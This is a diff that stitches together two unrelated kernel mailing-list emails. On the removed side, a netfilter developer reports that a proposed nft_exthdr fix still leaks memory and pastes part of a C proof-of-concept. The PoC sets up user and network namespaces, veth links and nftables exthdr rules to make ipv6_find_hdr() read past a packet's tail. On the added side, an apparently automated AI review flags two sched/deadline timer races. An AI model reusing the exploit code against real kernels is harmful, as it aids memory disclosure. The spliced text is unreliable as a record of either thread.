@@ -1,100 +1,57 @@
-Authentication-Results: smtp.subspace.kernel.org; arc=fail smtp.remote-ip=209.85.210.174
-ARC-Seal: i=2; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=fail;
-	t=1795657429;
-	b=FQrYZ8r1L8b29k0irSiqNQfSsPk4COrme6n9Gg7avWu6DmUYasODA8S+U0S5RtK5iIpt
-	 kwq0lTA+XyEbI5ZuGIU0a2nkDPPJWLQZEpzzAnpyaEtdw/jkOitNeZdhwjKwipNkdwKLZ
-	 WB3acaVI745zpSWKGqkHfD4FSFT3qZWF9RZ9e44RuRjmC3a99CBufgs/xNdnUuBXuSAFu
-	 XAe+VZkhiULksc/FVb/o4MdHsFnsKwTh2qc5TICS70JGwvIZWhO6DzzdUI+WyUFvOyw0i
-	 C4rYwAibSN0G2zAMg4xC5Lb0YoF8WzOT+Y4c7J7ZgF79zYeYVOvMmcov84OEhFcaK2A==
-ARC-Message-Signature: i=2; d=subspace.kernel.org; s=arc20261015;
-	a=rsa-sha256; c=relaxed/relaxed; t=1795657429;
-	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
-	 X-Forwarded-Encrypted:X-Gm-Message-State:X-Gm-Gg:X-Received:
-	 MIME-Version:References:In-Reply-To:From:Date:X-Gm-Features:
-	 Message-ID:Subject:To:Cc:Content-Type:Content-Transfer-Encoding;
-	bh=p2OMwSAupKVnOVH1s6/p9acTAXNTJP7ZElVm7AVIKZU=;
-	b=AcNOtPQNwZtN5aFgRmxUx/hJM1l5HvKLKs1hUk/Y/yjiq1RLbxVuBnegByYOwIBjN+hR
-	 A45WCrpqPT0fptU5D1IF98kDjNRGsAoBREBamh8hi+XfHnJ+rbWNpa4OpKqXaCfBTKpVA
-	 drIJ7mssmxT0rs1ojTTQAb4nQVAgx1rZnBQzpRAgoXSSz6mKqM++OOakwllrlqS6PIsma
-	 WP0g233jWwMp6bHheVXaazF2w+esHb5V/xFZD3qb7qIuuuoiFX5uYkRW9vZJcIiyyRAUr
-	 /TlUwJgL3q3JojRP/XERRN6G6vCcNpdruB0Rn+C7Db+yqnN7dkiyzas9toU+ouv6uxA==
-ARC-Authentication-Results: i=2; smtp.subspace.kernel.org; 
-	dmarc=pass header.from=asu.edu;
-	spf=pass smtp.mailfrom=asu.edu;
-	dkim=pass header.d=asu.edu header.i=@asu.edu header.a=rsa-sha256 header.s=google header.b=GKbIwy7E;
-	arc=fail smtp.remote-ip=209.85.210.174
-Received: from mail-pf1-f174.google.com (mail-pf1-f174.google.com [209.85.210.174])
-	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=100.103.45.18
+ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
+	t=1795657446;
+	b=OcFISvheG3tZXO3zOZLVNeV3k6QXvyqDQE1otjAa0ivJxqlkn+4V6u5/eP5jpP0pWSTB
+	 sk8jRr+KlCT5BbRxSRiucwvliJF3UMMIr9FU3R5g/tr6xrL1JaHyNWNKtlXkh7XcANqYi
+	 uHfB5FIlJFn9u664cEDCOadaZga1AIT37SOAtz+6Ur8ohOQzbG6Yz62NY2k/+RM8QHyYH
+	 R9yVCDZ0Z3oN2OUgF2gCg668qxY4ZxDGYflX0RSZ64OQPxUSjCgnkkOWAA/X1A3HG4eGP
+	 Qr/1F+cPBnMggwD4SzyHTVx6usawVN4hrIFwcNxRNT9vLbmYgWxwr0YaGgKPc4zGO9A==
+ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
+	a=rsa-sha256; c=relaxed/relaxed; t=1795657446;
+	h=Received:DKIM-Signature:Message-ID:From:Subject:Reply-To:To:Cc:
+	 In-Reply-To:References:Content-Type:Content-Transfer-Encoding:Date;
+	bh=m2RvOd+XVd5bUt3hWNxmT4fsaJ6Zs1eWnplpITK5zkM=;
+	b=HcNhDi38sryuJG/eeaHC6Zv86XAUJ8AoLLI3S6YIBWOG8vHw8TdULXOOY4PZz7HE1VSd
+	 FXxbBO88CQ3XBQibnwuEDGYBgnPy7FASZRn+cJkAXrSCmtURfw/d9aBj8IStht3fJZi4y
+	 SR6gtggY1v1e3oGm/kgjkSIgd2fPguAVIpoPVj0TdQt/JicYNKmusI73956UR5+WH0Fsq
+	 P47tnUzDlxUqHmt8WTfL/ygSf5X438EgCk2SYIaWOuN8bNOJZQKxDANe6Qj7QIfm2HfKQ
+	 wS9sUhKAVRV9JUB4DNjw9RpUg7u5atqM5ETbbfQFhQhI24VS/E8sLsy/vCxoBu8PiEQ==
+ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
+	dkim=pass header.d=kernel.org header.i=@kernel.org header.a=rsa-sha256 header.s=k20260515 header.b=C8U3mk9p;
+	arc=none smtp.remote-ip=100.103.45.18
+Received: from smtp.kernel.org (quasi.space.kernel.org [100.103.45.18])
+	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 4954C606A32D
-	for <linux-kernel@vger.kernel.org>; Thu, 26 Nov 2026 01:43:48 +0000 (UTC)
-DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 4954C606A32D
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=asu.edu
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id D41F4606A32D;
+	Thu, 26 Nov 2026 01:44:06 +0000 (UTC)
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.a=rsa-sha256 header.s=google header.b=GKbIwy7E
-Received: by mail-pf1-f174.google.com with SMTP id d2e1a72fcca58-8b612fd74e1so2271931b3a.0
-        for <linux-kernel@vger.kernel.org>; Wed, 25 Nov 2026 17:43:48 -0800 (PST)
-ARC-Seal: i=1; a=rsa-sha256; t=1795657428; cv=none;
-        d=google.com; s=arc-20260327;
-        b=VXfwbvXh9aK/1MO/e2hZ/07ZtctJhcrBP+1oyI7jfqC7qEr/MyCTOyaZ56bWdi/Z02
-         z6jUSCjH16IAUifGzPzBLJ4EWkkWcEGBxHNcfLK70YSy5c/eMCzAt1Svjim1QfChkz2F
-         1Z0q+oiW3HW11zKlRZieb1E83mRelr9REryaj8utTQmJ8b9a2Jfa1Qw1M4xcl1zK7CrN
-         l638pYA6Nwaldej5Xpl5EAuC7uL14JsEOkjuxBusNdsJg+5TmT72WCrlqwx/xPtFx/Lh
-         EnXyBWTE7w7cVHgamghFYTN7Kkzh/tBIGV6vopmJyO8lIUvgd0oTOTc+AgiWncDOZmhk
-         A96w==
-ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
-        h=content-transfer-encoding:cc:to:subject:message-id:date:from
-         :in-reply-to:references:mime-version:dkim-signature;
-        bh=p2OMwSAupKVnOVH1s6/p9acTAXNTJP7ZElVm7AVIKZU=;
-        fh=jxQWpq3R4GzLwESDaySZqADJmJDvd9jFYfH7qay3LDY=;
-        b=PoSQ9XJ4C/RKd04vYLc8vF/DYVfF8Qejp6cgVeIJQTdlrHNly7EcypJgFlYlk72i7A
-         FDT9e4YJgxtQomJytN9XVPS5Z3xpWqZtrPysXzEFGWcSxNpQisn5KudPSTdP8lcG6lBk
-         CkY6KwA+pwTv+TlldyEtepMXZZkNADj90avqpTYAIcaJ5OZVkpYz70N6zsNwr+ViGp76
-         GIHVpsf69vUPAkM23XoEOlVN612tuM2T4WPvEJQWbz9v+cT7vd9Vay0tP46F8SHNNVdw
-         nqK26PBo8nGbRXujXheICN8OCMGWEJ/2pf9xcdDnUTfZ/Taya4Zsa6CO1K75gsyWKu9P
-         exdQ==;
-        darn=vger.kernel.org
-ARC-Authentication-Results: i=1; mx.google.com; arc=none
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=asu.edu; s=google; t=1795657428; x=1796262228; darn=vger.kernel.org;
-        h=content-transfer-encoding:content-type:cc:to:subject:message-id
-         :date:from:in-reply-to:references:mime-version:from:to:cc:subject
-         :date:message-id:reply-to:content-type;
-        bh=p2OMwSAupKVnOVH1s6/p9acTAXNTJP7ZElVm7AVIKZU=;
-        b=GKbIwy7EsfppXcPV/Et1dgSiczDWZ18cslST1VQRE6opOPFRCiXz2yQEKcJb4MnFyw
-         ZLyFvuE6YxUGXffAtu8CDdybOhZWglOBNwYV2wBtXwMk73vK9jWo8LUH1T6+y/NZCoCZ
-         LiNBgzjibNol5naqalW7d3IegMrJWPaVP/DKetilWUDVqoc53XNz0Hh9Rv+jDlt2eaYa
-         +rnV+lCncOoD0HuM5UqxZg5pxWJno5BPn82NvToZBIxs58Lf1biJ81M1yZhCOZGPRmwU
-         fMAqXZeB85RR1akExnkWaP5mY1Ry/PhayaIPakNwPAQUUeCuekztekYNqhXvLtdU8d5A
-         3aTQ==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20260707; t=1795657428; x=1796262228;
-        h=content-transfer-encoding:content-type:cc:to:subject:message-id
-         :date:from:in-reply-to:references:mime-version:x-gm-gg
-         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
-         :content-type;
-        bh=p2OMwSAupKVnOVH1s6/p9acTAXNTJP7ZElVm7AVIKZU=;
-        b=YAgblbGS6GrLFqhjaJGI8grDfpTOmra6LE6ar9f8Qovadnbv7/BzK21/oAHbOgAOta
-         +D2eXUId+KT06p5f9IMO/OXh+8vwlK+M87kmc3V+i42OV9fdXWboqrkGsrSDiRKGFpiU
-         mSVeOijys/bNJXUn6V3qSqa5FvLkor2Eg5pjV+UqcdCLQir40aT4lqG5Y8so55aBNq+P
-         d8kzSkJzbTy7ajkj7cYMHwE1HQFOxNKnKQu4qv+qC4kuwq/NjYtnhzGWEw60p4flmrxu
-         m0uzJnm3Sz/cHHReTAfTgnJ0JA6EtbxPzL+L/5Pbx+6jRNWzuD8hhX4YwsnC7HsAXgyx
-         ES+g==
-X-Forwarded-Encrypted: i=1; AL+hErGtJkgKBTjNlZhcDwBvhVJrArVuZSPC3f1tT7iUZ6XRBgMyb/mw0L23m8mdCpFsz4Voh5b0nHK96C2PaYg=@vger.kernel.org
-X-Gm-Message-State: APuU4Z/1c+uFeAnI/o+h3c+drkg8YaeQ0JZJWjhGVL4S7Vxv410Qh8oQ
-	35qzd1n66H1g09DdzJX5ZeRpWfVSNOeKbOgN3Nj+Mw7WIpAXMwcPIhOFyz9YF04wgq8E5axkYh7
-	vg3q6DxQoJKsiXbHTKLnSDXIN5OkY4j/6oSGAvZcS
-X-Gm-Gg: AZFdTZdT2l/NS3TRt0RyG3TVJCQSXkbdJ6LM6dwN9lMAvwr5Bs7QfcxWHJGpKGxdIXx
-	LkSfAmCxMD+6orXtvm3cuy0CaQIpF09bK0LWKf6C9OyMzhleaieVh6w6k0eTSMQTlShNR0h7SFN
-	YubjfF2ofdWvSYETdzNCHT/KdsUKA6h0OTKRNlScDYzhE1fMtkF2EaOxn2md+58jI+DjvYuZ33M
-	wdAohrpiGYI+BofNieS/RRtnmmV3W1W9/uoqQ44G4Tpi6DiBYR3Er4lPCLu6S8WNkFvs0nFor0A
-	uj54Gc37oNes767fAyfSTWshpR6IA612QEsqEjEnxeUDBAMMfDJpfKgaxxJvWB49m8nnMzREGOX
-	lsMgmawD44NF5dxZyC9C3VEoGZhyBQogFnNDqEY5V5arw2E3YVbTdv3dHBcBZg4LVb8eM
-X-Received: by 2002:a05:6a21:6812:b0:3e2:8c31:21cf with SMTP id
- adf61e73a8af0-4014de5bd25mr18196958637.76.1795657427468; Wed, 25 Nov 2026
- 17:43:47 -0800 (PST)
+	dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.a=rsa-sha256 header.s=k20260515 header.b=C8U3mk9p
+Received: by smtp.kernel.org (Postfix) with ESMTPSA id 9E9671F000C4;
+	Thu, 26 Nov 2026 01:44:05 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=kernel.org;
+	s=k20260515; t=1795657445;
+	bh=m2RvOd+XVd5bUt3hWNxmT4fsaJ6Zs1eWnplpITK5zkM=;
+	h=From:Subject:Reply-To:To:Cc:In-Reply-To:References:Date;
+	b=C8U3mk9pQgmlVvzan6WdUvkg1YqZYTQR3I/tLHfiXXuK85/mFtHcVkbq9HzgCQ7y9
+	 ZFCJxXa04fxacBzjZQlaEFIjjyI1Otx2B39N57RigOwpgKarn25XXoEFXKK5edGnee
+	 roOWchZlfsBCuBXjl38zKUrOrxLzYg4xNTkTrQzAGrnIZup9nZJzH2n8PD5E77Z2a/
+	 Ha8Eq+cLmmBrK+ORoG3MdjHVEBqAAkpT/GaOZKpnAuNVKkDspObdo4gV3fAx/TiDDL
+	 6SUmn+Yq7F+mbf5Vu7OOHP5DAfBxu/2xJOD3lRAA64ets2LaLAYf13huEndA/G3woc
+	 ey2w7ztXi6sLw==
+Message-ID: <sashiko-outbox-234581@kernel.org>
+From: sashiko-bot@kernel.org
+Subject: Re: [PATCH v11 26/43] sched/deadline: Keep a departing constrained
+ task until its next period
+Reply-To: sashiko-reviews@lists.linux.dev
+To: "Mathieu Desnoyers" <mathieu.desnoyers@efficios.com>
+Cc: linux-rt-devel@lists.linux.dev, tj@kernel.org, hannes@cmpxchg.org, mkoutny@suse.com, linux-kernel@vger.kernel.org
+In-Reply-To: <06ad8ff186e425049082d0ee9b6518f85406257d.1795646914.git.mathieu.desnoyers@efficios.com>
+References: <cover.1795646914.git.mathieu.desnoyers@efficios.com>
+ <06ad8ff186e425049082d0ee9b6518f85406257d.1795646914.git.mathieu.desnoyers@efficios.com>
+Content-Type: text/plain; charset=utf-8
+Content-Transfer-Encoding: quoted-printable
+Date: Thu, 26 Nov 2026 01:44:05 +0000
 X-Mailing-List: linux-kernel@vger.kernel.org
 List-Id: <linux-kernel.vger.kernel.org>
 List-Post: <mailto:linux-kernel@vger.kernel.org>
@@ -103,540 +60,123 @@ List-Subscribe: <mailto:linux-kernel+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:linux-kernel+unsubscribe@vger.kernel.org>
 List-Owner: <mailto:linux-kernel+owner@vger.kernel.org>
 Precedence: list
-MIME-Version: 1.0
-References: <20261126001151.13793-1-xmei5@asu.edu> <awd9f47inahmDWRP@chamomile>
- <awd_r2mOR7xuYzh4@chamomile>
-In-Reply-To: <awd_r2mOR7xuYzh4@chamomile>
-From: Xiang Mei <xmei5@asu.edu>
-Date: Wed, 25 Nov 2026 18:43:35 -0700
-X-Gm-Features: Aa3M54racRdDiyseUzP7YgMzwacaYGswv7XwTiacCaigXQhxDeGIF2fGevwvleI
-Message-ID: <CAPpSM+TTd7sQvAjDS_u69xLNwtPgFrr23dxi8yKgRPfqosfjUQ@mail.gmail.com>
-Subject: Re: [PATCH nf] netfilter: nft_exthdr: pull the IPv6 header before ipv6_find_hdr()
-To: Pablo Neira Ayuso <pablo@netfilter.org>
-Cc: Florian Westphal <fw@strlen.de>, Phil Sutter <phil@nwl.cc>, "David S. Miller" <davem@davemloft.net>, 
-	Eric Dumazet <edumazet@kernel.org>, Jakub Kicinski <kuba@kernel.org>, Paolo Abeni <pabeni@redhat.com>, 
-	Willem de Bruijn <willemb@google.com>, Simon Horman <horms@kernel.org>, netfilter-devel@vger.kernel.org, 
-	coreteam@netfilter.org, netdev@vger.kernel.org, linux-kernel@vger.kernel.org, 
-	stable@vger.kernel.org, co+85229ab197510ca7@bugs.sh
-Content-Type: text/plain; charset="UTF-8"
-Content-Transfer-Encoding: quoted-printable
 
-On Wed, Nov 25, 2026 at 5:39=E2=80=AFPM Pablo Neira Ayuso <pablo@netfilter.=
-org> wrote:
->
-> On Thu, Nov 26, 2026 at 01:29:55AM +0100, Pablo Neira Ayuso wrote:
-> > On Wed, Nov 25, 2026 at 05:11:51PM -0700, Xiang Mei wrote:
-> [...]
-> > > Pull the header before the call, as act_ct, virtio_net_hdr_to_skb() a=
-nd
-> > > nft_set_pktinfo_ipv6_ingress() already do.
->
-> I prefer this patch (see attachment).
->
-> Please, don't take, I will submit it myself including your
-> Reported-by: tag.
->
-> Thanks.
+Thank you for your contribution! Sashiko AI review found 2 potential
+issues to consider:
+- [Medium] sched/deadline: dl_task_timer() advances period before
+  inactive_task_timer()
+- [Medium] sched/deadline: HRTIMER_RESTART in inactive_task_timer()
+  races with cancel
+--
 
-Sorry, I replied only to Pablo earlier. A resend of my test:
+commit 43e71343c7049144c9877a7ba7fddb15005d58e2
+Author: Mathieu Desnoyers <mathieu.desnoyers@efficios.com>
 
-Thanks for the patch. I have just tested it agaist the PoC (attached to
-this mail) but it still leaks.
+sched/deadline: Keep a departing constrained task until its next period
 
-The 18-byte 802.1Q frame still makes ipv6_find_hdr() read past the
-tail, same as the unpatched kernel. The pull in validate fails, we
-fall back to nft_set_pktinfo_unspec(), and nft_do_chain_netdev() still
-runs the chain, so exthdr gets called with only the skb->protocol
-check.
+This commit keeps a departing constrained SCHED_DEADLINE task's bandwidth
+and deadline until the later of its 0-lag time and its next period in
+task_non_contending() and inactive_task_timer().
 
-I think exthdr still needs its own check, or the netdev/bridge chains
-should not evaluate rules against an skb that failed validation. Your
-change still looks useful on top of that for the frags case.
+> diff --git a/kernel/sched/deadline.c b/kernel/sched/deadline.c
+> index 1d2dcf478f95d..11774b3b9fe93 100644
+> --- a/kernel/sched/deadline.c
+> +++ b/kernel/sched/deadline.c
 
-One more thing: nft_meta.c calls __nft_set_pktinfo_ipv6_validate()
-with a non-zero nhoff for VLAN/PPPoE, but the new code pulls and reads
-the header at offset 0, so it checks the outer header there.
+[ ... ]
 
-Thanks,
-Xiang
+> @@ -2598,6 +2614,25 @@ static enum hrtimer_restart inactive_task_timer(st=
+ruct hrtimer *timer)
+>  	if (dl_server(dl_se))
+>  		goto no_task;
+> =20
+> +	/*
+> +	 * A constrained task which has left the class keeps its bandwidth
+> +	 * and its deadline until its next period, as in
+> +	 * task_non_contending(). This timer may have been armed for the
+> +	 * 0-lag time while the task was still in the class.
+> +	 */
+> +	if (!dl_task(p) && READ_ONCE(p->__state) !=3D TASK_DEAD &&
+> +	    !dl_is_implicit(dl_se)) {
+> +		s64 left =3D dl_next_period(dl_se) - rq_clock(rq);
 
-The PoC:
-```c
-#include <errno.h>
-#include <fcntl.h>
-#include <sched.h>
-#include <stdint.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <unistd.h>
-#include <grp.h>
-#include <sys/prctl.h>
-#include <net/if.h>
-#include <arpa/inet.h>
-#include <sys/ioctl.h>
-#include <sys/socket.h>
-#include <sys/time.h>
-#include <linux/netlink.h>
-#include <linux/rtnetlink.h>
-#include <linux/if_packet.h>
-#include <linux/if_ether.h>
+[Severity: Medium]
+Can dl_task_timer() advance dl_se->deadline before inactive_task_timer()
+computes dl_next_period(dl_se), holding the departed task's bandwidth for
+an extra period?
 
-#define NFNL_SUBSYS_NFTABLES    10
-#define NFNL_MSG_BATCH_BEGIN    16
-#define NFNL_MSG_BATCH_END      17
-#define NFT_MSG_NEWTABLE        0
-#define NFT_MSG_NEWCHAIN        3
-#define NFT_MSG_NEWRULE         6
-#define NFT_MSG_GETRULE         7
-#define NFTA_TABLE_NAME         1
-#define NFTA_CHAIN_TABLE        1
-#define NFTA_CHAIN_NAME         3
-#define NFTA_CHAIN_HOOK         4
-#define NFTA_CHAIN_TYPE         7
-#define NFTA_HOOK_HOOKNUM       1
-#define NFTA_HOOK_PRIORITY      2
-#define NFTA_HOOK_DEV           3
-#define NFTA_RULE_TABLE         1
-#define NFTA_RULE_CHAIN         2
-#define NFTA_RULE_EXPRESSIONS   4
-#define NFTA_RULE_USERDATA      7
-#define NFTA_LIST_ELEM          1
-#define NFTA_EXPR_NAME          1
-#define NFTA_EXPR_DATA          2
-#define NFTA_EXTHDR_DREG        1
-#define NFTA_EXTHDR_TYPE        2
-#define NFTA_EXTHDR_OFFSET      3
-#define NFTA_EXTHDR_LEN         4
-#define NFTA_EXTHDR_FLAGS       5
-#define NFT_EXTHDR_F_PRESENT    1
-#define NFTA_CMP_SREG           1
-#define NFTA_CMP_OP             2
-#define NFTA_CMP_DATA           3
-#define NFTA_DATA_VALUE         1
-#define NFTA_COUNTER_PACKETS    2
-#define NFPROTO_NETDEV          5
-#define NFT_REG_1               1
-#ifndef NETLINK_NETFILTER
-#define NETLINK_NETFILTER       12
-#endif
+When a constrained task is throttled before leaving SCHED_DEADLINE,
+dl_se->dl_timer remains armed for the end of the departure period while
+dl_se->inactive_timer is armed for max(0-lag time, dl_next_period(dl_se)).
+When dl_task_timer() fires at the period boundary while !dl_task(p), it
+replenishes the entity:
 
-#define ROUNDS          64
-
-struct nfgen { uint8_t family, version; uint16_t res_id; };
-
-static int nl, pfd, ifi;
-static uint32_t seq =3D 1;
-static uint64_t cnt[256];
-
-static void die(const char *m) { fprintf(stderr, "[-] %s: %s\n", m,
-strerror(errno)); exit(1); }
-
-static char *put(char *p, int type, const void *d, int len)
-{
-        struct nlattr *a =3D (struct nlattr *)p;
-
-        a->nla_type =3D type;
-        a->nla_len =3D NLA_HDRLEN + len;
-        memcpy(p + NLA_HDRLEN, d, len);
-        memset(p + NLA_HDRLEN + len, 0, NLA_ALIGN(len) - len);
-        return p + NLA_ALIGN(a->nla_len);
-}
-static char *put_str(char *p, int t, const char *s) { return put(p, t,
-s, strlen(s) + 1); }
-static char *put_be32(char *p, int t, uint32_t v) { v =3D htonl(v);
-return put(p, t, &v, 4); }
-static char *nest(char **p, int type)
-{
-        struct nlattr *a =3D (struct nlattr *)*p;
-
-        a->nla_type =3D type | NLA_F_NESTED;
-        *p +=3D NLA_HDRLEN;
-        return (char *)a;
-}
-static void nest_end(char *a, char *p) { ((struct nlattr *)a)->nla_len
-=3D p - a; }
-
-/* ---------------------------------------------------------------- setup *=
-/
-
-static void write_file(const char *path, const char *s)
-{
-        int fd =3D open(path, O_WRONLY);
-
-        if (fd < 0 || write(fd, s, strlen(s)) < 0)
-                die(path);
-        close(fd);
+kernel/sched/deadline.c:dl_task_timer() {
+    ...
+	if (!dl_task(p)) {
+		if (dl_se->dl_throttled && !is_dl_boosted(dl_se)) {
+			sched_clock_tick();
+			update_rq_clock(rq);
+			replenish_dl_entity(dl_se);
+		}
+		goto unlock;
+	}
+    ...
 }
 
-static void enter_ns(void)
-{
-        char map[32];
-        uid_t uid =3D getuid();
-        gid_t gid =3D getgid();
+replenish_dl_entity() adds dl_se->dl_period to dl_se->deadline until
+dl_se->runtime > 0.  When inactive_task_timer() then runs at the period
+boundary (or later at the 0-lag time after an overrun), dl_next_period()
+is computed from the replenished dl_se->deadline, so left > 0 and
+inactive_task_timer() restarts for another full period instead of
+releasing the task's bandwidth and clearing its parameters.  If the task
+re-enters SCHED_DEADLINE during that extra period after the advanced
+deadline, dl_check_constrained_dl() also throttles it until the end of the
+second period.
 
-        if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0)
-                die("unshare");
-        write_file("/proc/self/setgroups", "deny");
-        snprintf(map, sizeof(map), "0 %d 1", uid);
-        write_file("/proc/self/uid_map", map);
-        snprintf(map, sizeof(map), "0 %d 1", gid);
-        write_file("/proc/self/gid_map", map);
-}
+> +
+> +		if (left > 0) {
+> +			ktime_t at =3D ktime_add_ns(hrtimer_cb_get_time(timer), left);
+> +
+> +			hrtimer_set_expires(timer, at);
+> +			task_rq_unlock(rq, p, &rf);
+> +			return HRTIMER_RESTART;
+> +		}
+> +	}
 
-static void rtnl_veth(void)
-{
-        char buf[512] =3D {}, *p, *li, *id, *peer;
-        struct nlmsghdr *h =3D (struct nlmsghdr *)buf;
-        int fd =3D socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
+[Severity: Medium]
+Can returning HRTIMER_RESTART after task_rq_unlock() race with
+cancel_inactive_timer() in switched_to_dl() and leave inactive_timer
+queued after the task returns to SCHED_DEADLINE?
 
-        h->nlmsg_type =3D RTM_NEWLINK;
-        h->nlmsg_flags =3D NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL;
-        p =3D (char *)NLMSG_DATA(h) + NLMSG_ALIGN(sizeof(struct ifinfomsg))=
-;
-        p =3D put_str(p, IFLA_IFNAME, "vp0");
-        li =3D nest(&p, IFLA_LINKINFO);
-        p =3D put(p, IFLA_INFO_KIND, "veth", 4);
-        id =3D nest(&p, IFLA_INFO_DATA);
-        peer =3D nest(&p, 1 /* VETH_INFO_PEER */);
-        p +=3D sizeof(struct ifinfomsg);
-        p =3D put_str(p, IFLA_IFNAME, "vp1");
-        nest_end(peer, p);
-        nest_end(id, p);
-        nest_end(li, p);
-        h->nlmsg_len =3D p - buf;
-        if (fd < 0 || send(fd, buf, h->nlmsg_len, 0) < 0)
-                die("RTM_NEWLINK");
-        close(fd);
-}
+cancel_dl_timer() assumes that when hrtimer_try_to_cancel() returns -1,
+the running callback will finish with HRTIMER_NORESTART and drop the task
+reference.  Because __run_hrtimer() only re-acquires cpu_base->lock and
+re-enqueues the timer after inactive_task_timer() returns, another CPU can
+run switched_to_dl() in between:
 
-static void link_up(const char *name)
-{
-        struct ifreq ifr =3D {};
-        int fd =3D socket(AF_INET, SOCK_DGRAM, 0);
+CPU0                                  CPU1
+__run_hrtimer()
+  inactive_task_timer()
+    hrtimer_set_expires(timer, at)
+    task_rq_unlock(rq, p, &rf)
+                                      __sched_setscheduler()
+                                        task_rq_lock(p, &rf)
+                                        switched_to_dl()
+                                          cancel_inactive_timer(&p->dl)
+                                            hrtimer_try_to_cancel() -> -1
+                                        task_rq_unlock(rq, p, &rf)
+    return HRTIMER_RESTART
+  raw_spin_lock(&cpu_base->lock)
+  enqueue_hrtimer(timer, base, ...)   <-- queued while p is in DL
 
-        strncpy(ifr.ifr_name, name, IFNAMSIZ - 1);
-        if (ioctl(fd, SIOCGIFFLAGS, &ifr) < 0)
-                die("SIOCGIFFLAGS");
-        ifr.ifr_flags |=3D IFF_UP;
-        if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0)
-                die("SIOCSIFFLAGS");
-        close(fd);
-}
+p is then back in SCHED_DEADLINE with dl_non_contending =3D=3D 0 while
+hrtimer_active(&p->dl.inactive_timer) is true.  If p blocks or leaves
+SCHED_DEADLINE before that stale timer fires, task_non_contending() sees
+hrtimer_active(&dl_se->inactive_timer) and immediately subtracts
+running_bw or releases the task's bandwidth and clears its deadline before
+the 0-lag time.
 
-/* ------------------------------------------------------------- nftables *=
-/
-
-static char *msg(char *cur, int type, int flags)
-{
-        struct nlmsghdr *h =3D (struct nlmsghdr *)cur;
-        struct nfgen *g =3D (struct nfgen *)NLMSG_DATA(h);
-
-        memset(h, 0, NLMSG_HDRLEN + sizeof(*g));
-        h->nlmsg_type =3D (NFNL_SUBSYS_NFTABLES << 8) | type;
-        h->nlmsg_flags =3D NLM_F_REQUEST | flags;
-        h->nlmsg_seq =3D ++seq;
-        g->family =3D NFPROTO_NETDEV;
-        return cur + NLMSG_HDRLEN + sizeof(*g);
-}
-static char *msg_end(char *cur, char *p) { ((struct nlmsghdr
-*)cur)->nlmsg_len =3D p - cur; return p; }
-static char *batch(char *cur, int type)
-{
-        struct nlmsghdr *h =3D (struct nlmsghdr *)cur;
-        struct nfgen *g =3D (struct nfgen *)NLMSG_DATA(h);
-
-        memset(h, 0, NLMSG_HDRLEN + sizeof(*g));
-        h->nlmsg_type =3D type;
-        h->nlmsg_flags =3D NLM_F_REQUEST;
-        h->nlmsg_seq =3D ++seq;
-        h->nlmsg_len =3D NLMSG_HDRLEN + sizeof(*g);
-        g->res_id =3D htons(NFNL_SUBSYS_NFTABLES);
-        return cur + h->nlmsg_len;
-}
-
-static void nft_commit(char *buf, char *end)
-{
-        char rb[8192];
-        int n;
-
-        if (send(nl, buf, end - buf, 0) < 0)
-                die("nft send");
-        while ((n =3D recv(nl, rb, sizeof(rb), MSG_DONTWAIT)) > 0) {
-                struct nlmsghdr *r =3D (struct nlmsghdr *)rb;
-
-                for (; NLMSG_OK(r, n); r =3D NLMSG_NEXT(r, n)) {
-                        struct nlmsgerr *e =3D (struct nlmsgerr *)NLMSG_DAT=
-A(r);
-
-                        if (r->nlmsg_type =3D=3D NLMSG_ERROR && e->error) {
-                                errno =3D -e->error;
-                                die("nft batch");
-                        }
-                }
-        }
-}
-
-static char *rule(char *cur, int t)
-{
-        uint8_t ud =3D t, one =3D 1;
-        char *p, *ex, *e, *d, *v;
-
-        p =3D msg(cur, NFT_MSG_NEWRULE, NLM_F_CREATE | NLM_F_APPEND | NLM_F=
-_ACK);
-        p =3D put_str(p, NFTA_RULE_TABLE, "t");
-        p =3D put_str(p, NFTA_RULE_CHAIN, "c");
-        p =3D put(p, NFTA_RULE_USERDATA, &ud, 1);
-        ex =3D nest(&p, NFTA_RULE_EXPRESSIONS);
-
-        e =3D nest(&p, NFTA_LIST_ELEM);                   /* exthdr ipv6
-type t exists */
-        p =3D put_str(p, NFTA_EXPR_NAME, "exthdr");
-        d =3D nest(&p, NFTA_EXPR_DATA);
-        p =3D put_be32(p, NFTA_EXTHDR_DREG, NFT_REG_1);
-        p =3D put(p, NFTA_EXTHDR_TYPE, &ud, 1);
-        p =3D put_be32(p, NFTA_EXTHDR_OFFSET, 0);
-        p =3D put_be32(p, NFTA_EXTHDR_LEN, 1);
-        p =3D put_be32(p, NFTA_EXTHDR_FLAGS, NFT_EXTHDR_F_PRESENT);
